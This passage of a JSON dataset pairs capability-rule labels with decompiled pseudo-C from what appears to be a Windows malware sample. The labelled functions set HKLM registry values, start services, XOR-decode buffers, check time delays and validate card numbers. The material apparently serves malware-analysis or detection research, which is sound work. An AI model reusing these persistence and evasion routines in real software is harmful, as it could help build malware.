0x41f634;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, str.MP, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x406424, 1, 0x40642c, 0x14);\n    return;\n}\n",
        "token_count": 650
    },
    "00404750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00404750(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403bc0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, 0x406244, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 260
    },
    "00401d20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401d20(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 237
    },
    "00401cd0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cf5) overlaps instruction at (ram,0x00401cf4)\n// \n// WARNING: Removing unreachable block (ram,0x00401cf5)\n\nvoid fcn.00401cd0(uint param_1)\n\n{\n    uint in_EAX;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        *unaff_EDI = in_EAX;\n    }\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 173
    },
    "00402210": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402231) overlaps instruction at (ram,0x00402230)\n// \n\nbool fcn.00402210(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint arg_ch;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar4;\n    uint8_t unaff_BL;\n    uchar **unaff_EBP;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    uint var_314h;\n    uint var_210h;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    uchar auStack792 [260];\n    uchar auStack532 [260];\n    uchar var_10ch_2;\n    uint var_10bh_2;\n    int32_t var_8h_2;\n    int32_t iStack8;\n    uchar *puStack4;\n    \n    do {\n        uVar3 = 0;\n        var_10ch_2 = 0;\n        bVar6 = false;\n        bVar8 = false;\n        bVar7 = true;\n        puVar5 = &var_10bh_2;\n        puStack4 = unaff_EBP;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        while( true ) {\n            var_8h_2 = 0;\n            *puVar5 = uVar3;\n            puVar1 = puVar5 + 3;\n            *(puVar5 + 2) = uVar3;\n            if ((!bVar6 && !bVar7) && (bVar6 || bVar7)) break;\n            uVar3 = fcn.00401c00();\n            if ((bVar6 || bVar7) || (!bVar6 && !bVar7)) {\n                (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&var_10ch_2, 0x104);\n                iStack8 = 0;\n                goto code_r0x00402298;\n            }\n            if (!bVar8) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar3 = uVar3 & 0xffff0000 | uVar3 / unaff_BL & 0xff | uVar3 % unaff_BL << 8;\n            puVar5 = puVar5 + 7;\n            *puVar1 = uVar3;\n        }\n        unaff_EBP = &puStack4;\n        if (!bVar8) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    } while( true );\ncode_r0x00402298:\n    do {\n        arg_ch = fcn.00401bd0();\n        arg_ch_00 = fcn.00401bd0();\n        arg_ch_01 = fcn.00401bd0();\n        fcn.00401dc0(var_314h, arg_ch);\n        fcn.00401dc0(param_1, arg_ch_00);\n        fcn.00401dc0(param_2, arg_ch_01);\n        pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(auStack792, 0x406024, &var_10ch_2, var_314h);\n        iVar4 = fcn.00402650(auStack792);\n        if (iVar4 != 0) {\n            (*pcVar2)(auStack532, 0x406030, &var_10ch_2, param_1);\n            iVar4 = fcn.00402650(auStack532);\n            if (iVar4 != 0) {\n                (*pcVar2)(auStack532, 0x406030, &var_10ch_2, param_2);\n                iVar4 = fcn.00402650(auStack532);\n                if (iVar4 != 0) {\n                    iVar4 = 1;\n                    break;\n                }\n            }\n        }\n        iStack8 = iStack8 + 1;\n        iVar4 = var_8h_2;\n    } while (iStack8 < 3);\n    fcn.00401dc0(param_4, 4);\n    return iVar4 != 0;\n}\n",
        "token_count": 1025
    },
    "00402840": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402888) overlaps instruction at (ram,0x00402884)\n// \n\nvoid __cdecl fcn.00402840(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    uint32_t unaff_EBX;\n    int32_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    iVar3 = 0;\n    if (0 < arg_14h) {\n        do {\n            pcVar2 = iVar3 % arg_ch;\n            bVar4 = (unaff_EBX & 0x4d) == 0;\n            if ((bVar4) || (!bVar4)) {\n                *(iVar3 + arg_10h) = arg_14h ^ *(iVar3 + arg_10h) ^ pcVar2[arg_8h];\n                iVar3 = iVar3 + 1;\n                bVar5 = SBORROW4(iVar3, arg_14h);\n                bVar4 = iVar3 - arg_14h < 0;\n            }\n            else {\n                *pcVar2 = *pcVar2 << 1;\n                bVar4 = *pcVar2 < '\\0';\n                puVar1 = (arg_8h & 0xffffff00 | arg_8h + 0x8a) + 0x3b463e14;\n                *puVar1 = *puVar1 >> 1 | ((*puVar1 & 1) != 0) << 0x1f;\n                bVar5 = ((*puVar1 & 0x40000000) != 0) != *puVar1 < 0;\n                LOCK();\n            }\n        } while (bVar5 != bVar4);\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "00401eb0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401eb0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, 0x406248, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}